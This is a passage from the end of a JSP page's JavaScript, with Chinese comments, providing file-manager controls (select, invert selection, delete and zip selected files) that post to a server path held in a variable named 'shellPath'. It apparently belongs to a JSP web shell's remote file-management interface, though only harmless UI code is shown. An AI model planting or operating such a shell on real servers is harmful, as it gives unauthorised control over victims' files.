		return s.substr(0,s.length-1);
	}
	return "";
}
//全选
function checkAll()
 {
   var inputs=document.getElementById("filesList").getElementsByTagName("input");
   for(var i=0;i<inputs.length;i++){
    	inputs[i].checked=true;
   }
 }
 //删除选中
function delSelectFiles(path)
{
	 
  var delfs=getSelect();
  if(delfs==""){
	  alert("没有选择文件！");
	  return;
  }
  post('/MyJspWebManage/index.jsp',{'m':'FileManage','do':'delete','path':path,'files':delfs});
}
 
function packSelectFiles(path)
{
  var pfs=getSelect();
  if(pfs==""){
	  alert("没有选择文件！");
	  return;
  }
  var zipName = prompt('请输入压缩文件名！','');
  if (zipName == null || zipName.trim().length == 0){
	  alert("输入错误！");
	  return;
	}
	post('<%=shellPath%>',{'m':'FileManage','do':'packFiles','path':path,'files':pfs,'zipName':zipName});
}
 
//反选
function revsAll()
 {
   var inputs=document.getElementById("filesList").getElementsByTagName("input");
   for(var i=0;i<inputs.length;i++){
	   if(inputs[i].checked){
		   inputs[i].checked=false;  
	   }
	   else{
		   inputs[i].checked=true;
	   }
    	
   }
}
</script>
</body>
</html>